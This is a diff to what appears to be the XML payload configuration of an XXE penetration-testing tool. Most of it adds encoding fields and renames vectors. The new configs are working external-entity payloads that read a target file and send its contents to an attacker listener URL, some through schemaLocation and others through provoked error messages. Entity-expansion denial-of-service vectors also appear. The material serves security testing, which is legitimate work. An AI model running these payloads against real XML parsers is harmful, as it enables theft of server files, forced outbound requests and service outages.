@@ -8,8 +8,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "§tf_listenURL§">
@@ -31,8 +32,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY dos SYSTEM "§tf_listenURL§" >
@@ -56,8 +58,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-16</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-16"?>
 <!DOCTYPE data [
@@ -85,8 +88,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-7</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="UTF-7"?>
 <!DOCTYPE data [
@@ -114,8 +118,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY dos SYSTEM "§tf_listenURL§" >
@@ -139,8 +144,9 @@
         <helperURL>true</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>true</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<!DOCTYPE data SYSTEM "§tf_helperURL§" [
 <!ELEMENT data (#PCDATA)>
@@ -176,8 +182,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector>
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY a0 "dos" >
@@ -199,8 +206,9 @@
         <helperURL>false</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector>
     <directMessage><![CDATA[<!DOCTYPE data [
 <!ENTITY a0 "dosdosdosdosdosdosdos"
@@ -218,6 +226,7 @@
         <helperURL>false</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
     <attackvectors>
     <attackvector>
@@ -238,8 +247,9 @@
         <helperURL>true</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>true</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
@@ -273,8 +283,9 @@
         <helperURL>true</helperURL>
         <attackListenerURL>false</attackListenerURL>
         <externalResources>true</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="false">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data [
@@ -304,16 +315,17 @@
     </attackvectors>
     </config>
     <config>
-    <name>FileAccess: Out-of-Band channels (noNamespaceSchemaLocation)</name>
-    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <name>URL Invocation: noNamespaceSchemaLocation</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs. </description>
     <params>
         <dosbox>false</dosbox>
         <targetFile>false</targetFile>
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[<?xml version='1.0'?>
 <data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -322,16 +334,17 @@ xsi:noNamespaceSchemaLocation="§tf_listenURL§">4</data>]]></directMessage>
     </attackvectors>
     </config>
     <config>
-    <name>FileAccess: Out-of-Band channels (schemaLocation)</name>
-    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <name>URL Invocation: schemaLocation</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs. </description>
     <params>
         <dosbox>false</dosbox>
         <targetFile>false</targetFile>
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[ <?xml version='1.0'?>
 <ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -349,8 +362,9 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
         <helperURL>true</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>true</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE data SYSTEM "§tf_helperURL§">
@@ -378,8 +392,9 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
         <helperURL>true</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>true</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector type="system" default="true">
     <directMessage><![CDATA[<?xml version="1.0"?>
 <!DOCTYPE data [
@@ -407,20 +422,94 @@ xsi:schemaLocation="§tf_listenURL§">4</ttt:data>]]></directMessage>
     </attackvectors>
     </config>
     <config>
-    <name>FileAccess: Out-of-Band channels (xInclude)</name>
-    <description>Just because there is no direct feedback channel available does not imply that an XXE attack is not possible. </description>
+    <name>URL Invocation: xInclude</name>
+    <description>The idea of this attack is to force the parser to call arbitrary URLs. </description>
     <params>
         <dosbox>false</dosbox>
         <targetFile>false</targetFile>
         <helperURL>false</helperURL>
         <attackListenerURL>true</attackListenerURL>
         <externalResources>false</externalResources>
+        <encoding>UTF-8</encoding>
     </params>
-    <attackvectors>
+    <attackvectors intruderVector="true">
     <attackvector>
     <directMessage><![CDATA[<?xml version='1.0'?>
 <data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="§tf_listenURL§"></xi:include></data>]]></directMessage>
     </attackvector>
     </attackvectors>
+    </config>
+    <config>
+        <name>FileAccess: Out-of-Band channels (schemaEntity)</name>
+        <description>This vector exploits attribute normalization to transmit external resources that may contain newlines and special character by means of parameter entities and noNamespaceSchemaLocation. Similar technique could be used with xInclude or SchemaLocation.</description>
+        <params>
+            <dosbox>false</dosbox>
+            <targetFile>true</targetFile>
+            <helperURL>true</helperURL>
+            <attackListenerURL>true</attackListenerURL>
+            <externalResources>true</externalResources>
+            <encoding>UTF-8</encoding>
+        </params>
+        <attackvectors intruderVector="false">
+        <attackvector type="system" default="true">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+]>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="§tf_listenURL§/&internal;"></data>]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal ’%payload;’>">
+%param1;]]></helperMessage>
+        </attackvector>
+        <attackvector type="public">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;]>
+<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="§tf_listenURL§/&internal;"></data>]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p2" "§tf_targetFILE§">
+<!ENTITY % param1 "<!ENTITY internal ’%payload;’>">
+%param1;]]></helperMessage>
+        </attackvector>
+        </attackvectors>
+    </config>
+    <config>
+        <name>FileAccess: Exploiting verbose error messages</name>
+        <description>In some cases verbose error messages can be tricked into including data from external resources. This vector refers to an invalid file:// handler to provoke an error message that includes the contents of a target file. See "Pre-authentication XXE vulnerability in the Services Drupal module", Dubourguais, 2015</description>
+        <params>
+            <dosbox>false</dosbox>
+            <targetFile>true</targetFile>
+            <helperURL>true</helperURL>
+            <attackListenerURL>true</attackListenerURL>
+            <externalResources>true</externalResources>
+            <encoding>UTF-8</encoding>
+        </params>
+        <attackvectors>
+        <attackvector type="system" default="true">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "§tf_helperURL§">
+%remote;
+%intern;
+%trick;
+]>
+<data>42</data>
+]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload SYSTEM "§tf_targetFILE§">
+<!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'file:///no/such/file/exists/%payload;'>">
+]]></helperMessage>
+        </attackvector>
+        <attackvector type="public">
+        <directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY % remote PUBLIC "p" "§tf_helperURL§">
+%remote;
+%intern;
+%trick;
+]>
+<data>42</data>
+]]></directMessage>
+        <helperMessage><![CDATA[<!ENTITY % payload PUBLIC "p1" "§tf_targetFILE§">
+<!ENTITY % intern "<!ENTITY &#37; trick PUBLIC "p2" 'file://no/such/file/exists/%payload;'>">
+]]></helperMessage>
+        </attackvector>
+        </attackvectors>
     </config>
 </configs>
